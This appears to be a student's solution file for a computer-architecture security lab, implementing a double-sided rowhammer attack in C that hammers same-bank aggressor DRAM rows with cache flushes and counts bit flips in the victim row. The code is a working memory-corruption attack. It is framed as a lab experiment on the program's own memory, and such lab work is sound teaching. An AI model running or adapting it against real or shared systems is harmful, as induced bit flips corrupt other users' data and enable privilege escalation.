#include "../shared.hh"
#include "../verif.hh"
#include "../params.hh"
#include "../util.hh"

// TODO: Candidate id derived in part3
#define BANK_FUNC_CAND 0

// TODO: Try different combinations of these parameters to find the best ones for the machine!
#define VIC_DATA 0x00
#define AGG_DATA 0xff 

#define NUM_HAMMER_ATTEMPTS 100


char *dram_to_str(uint64_t phys_ptr);

/*
 * hammer_addresses
 *
 * Performs a double-sided rowhammer attack on a given victim address,
 * given two aggressor addresses.
 *
 * Input: victim address, and two attacker addresses (all *physical*)
 * Output: True if any bits have been flipped, false otherwise.
 *
 */
uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t hp_base) {
                      
    uint64_t foundFlips = 0;

    volatile uint8_t *attA_ptr = (uint8_t*) attA;
    volatile uint8_t *attB_ptr = (uint8_t*) attB;

    // Align to row base (8KB rows)
    //Test git issues
    uint64_t vict_row = vict & ~(ROW_STRIDE - 1);
    uint64_t attA_row = attA & ~(ROW_STRIDE - 1);
    uint64_t attB_row = attB & ~(ROW_STRIDE - 1);

    // -----------------------------
    // 1. PRIME
    // -----------------------------

    // Victim = 0x00
    memset((void*)vict_row, VIC_DATA, ROW_STRIDE);
    for (int i = 0; i < ROW_STRIDE; i++) {
    if (((uint8_t*)vict_row)[i] != VIC_DATA) {
        printf("BUG: victim corrupted during setup at offset %d\n", i);
        exit(1);
    }
}

    // Aggressors = 0xff
    memset((void*)attA_row, AGG_DATA, ROW_STRIDE);
    memset((void*)attB_row, AGG_DATA, ROW_STRIDE);

    // 🔑 CRITICAL: Flush ALL rows after priming
    for (int i = 0; i < ROW_STRIDE; i += 64) {
        clflush((void*)(vict_row + i));
        clflush((void*)(attA_row + i));
        clflush((void*)(attB_row + i));
    }

    mfence();

    // -----------------------------
    // 2. HAMMER
    // -----------------------------

    for (int i = 0; i < 5000000; i++) {
        one_block_access((uint64_t)attA_ptr);
        clflush((void*)attA_ptr);

        one_block_access((uint64_t)attB_ptr);
        clflush((void*)attB_ptr);
    }

    mfence();

    // -----------------------------
    // 3. PROBE
    // -----------------------------

    for (int i = 0; i < ROW_STRIDE; i++) {
        if (((uint8_t*)vict_row)[i] != VIC_DATA) {
            foundFlips = 1;
            break;
        }
    }

    return foundFlips;
}

/*
 *
 * DO NOT MODIFY BELOW ME
 *
 */



int main(int argc, char** argv) {
    srand(time(NULL));
    setvbuf(stdout, NULL, _IONBF, 0);
    
    // Allocate a large pool of memory (of size BUFFER_SIZE_MB) pointed to
    // by allocated_mem
    allocated_mem = allocate_pages(BUFFER_SIZE_MB * 1024UL * 1024UL);
 
    // Setup, then verify the PPN_VPN_map
    setup_PPN_VPN_map(allocated_mem, PPN_VPN_map);
    verify_PPN_VPN_map(allocated_mem, PPN_VPN_map);

    // Now, run all of the experiments!
    int sum_flips = 0;
    for(int i = 0; i < NUM_HAMMER_ATTEMPTS; i++) {
        uint64_t vict, vict_row_base;
        uint64_t attA, attB;
        uint64_t attA_phys, attB_phys, vict_phys;
        uint64_t hp_base;


        // Randomly select a pair of aggressor rows that are adjacent to a victim row, and make sure they are in the same bank.
        // You don't need to worry about how to find these addresses, since we play with the Row_stride and Huge page constraints, which makes it easy to find such addresses. 
        // vic, attA, attB are virtual addresses you'll hammer on.
        while (1) {

            // pick random victim VA
            vict = (uint64_t)get_rand_addr(BUFFER_SIZE_MB * 1024UL * 1024UL);

            // same 2MB page constraint
            hp_base = vict & HUGE_PAGE_MASK;
            uint64_t off     = vict - hp_base;
            uint64_t row_in_hp = off >> 17;   // 0..15

            if (row_in_hp == 0 || row_in_hp == 15) continue;

            vict_row_base = hp_base + (row_in_hp << 17);
            vict_phys = virt_to_phys(vict_row_base);

            uint64_t tar_bank =
                phys_to_bankid(vict_phys, BANK_FUNC_CAND);

            uint64_t attA_base = vict_row_base - ROW_STRIDE;   // V-1 row base
            uint64_t attB_base = vict_row_base + ROW_STRIDE;   // V+1 row base

            bool found = false;

            for (int oa = 0; oa < 16 && !found; oa++) {

                uint64_t va = attA_base + ((uint64_t)oa << 13);
                attA_phys = virt_to_phys(va);

                if (phys_to_bankid(attA_phys, BANK_FUNC_CAND) != tar_bank)
                    continue;

                for (int ob = 0; ob < 16; ob++) {

                    uint64_t vb = attB_base + ((uint64_t)ob << 13);
                    attB_phys = virt_to_phys(vb);

                    if (phys_to_bankid(attB_phys, BANK_FUNC_CAND) != tar_bank)
                        continue;

                    attA = va;
                    attB = vb;
                    found = true;
                    break;
                }
            }

            if (found) break;
        }
        

        memset((void*)hp_base, VIC_DATA, HUGE_PAGE_SIZE);

        printf("[HAMMER] A: %s B: %s\n", dram_to_str(attA_phys), dram_to_str(attB_phys));

        sum_flips += hammer_addresses(vict, attA, attB, hp_base);
    }



    printf("Number of bit-flip successes observed out of %d attempts: %d\n",
           NUM_HAMMER_ATTEMPTS, sum_flips); 
    
}


char *dram_to_str(uint64_t phys_ptr){
    char *ret_str = (char*)malloc(64);
	memset(ret_str, 0x00, 64);
    sprintf(ret_str, "bk:%ld, row:%05ld, col:%05ld", phys_to_bankid(phys_ptr, BANK_FUNC_CAND), phys_to_rowid(phys_ptr), phys_to_colid(phys_ptr));
    return ret_str;
}